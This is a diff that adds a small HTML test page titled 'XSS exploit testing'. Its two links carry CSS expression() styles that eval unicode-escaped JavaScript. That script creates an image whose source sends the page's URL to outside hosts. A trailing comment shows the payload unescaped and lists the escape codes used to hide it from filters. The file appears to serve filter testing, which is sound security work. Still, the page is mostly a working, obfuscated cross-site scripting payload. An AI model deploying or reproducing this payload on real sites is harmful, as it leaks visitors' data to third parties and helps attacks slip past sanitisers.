@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<title>XSS exploit testing</title>
+	</head>
+	<body>
+		<p><a href="" style="color:red;width:expression(eval('\u0028new \u0049mage\u0028\u0029\u0029.src=\u0027http\u003A//www.kkaji-test-abcdefgh.com/\u0027+location.href\u003B99'))">hihihi</a></p>
+		
+		<p><a href="" style="color:red; width:expression(eval('new \u0049mage()').src='https://e.co/'+location.href); background-color: teal">hihihi</a></p>
+	</body>
+</html>
+
+<!--
+
+(new Image()).src='https://example.com/'+location.href
+\u0028new \u0049mage\u0028\u0029\u0029.src=\u0027https\u003A//example.com/\u0027+location.href\u003B99
+
+eval('\u0028new \u0049mage\u0028\u0029\u0029.src=\u0027https\u003A//example.com/\u0027+location.href\u003B99')
+
+I \u0049
+' \u0027
+" \u0022
+: \u003A
+; \u003B
+( \u0028
+) \u0029
+
+-->
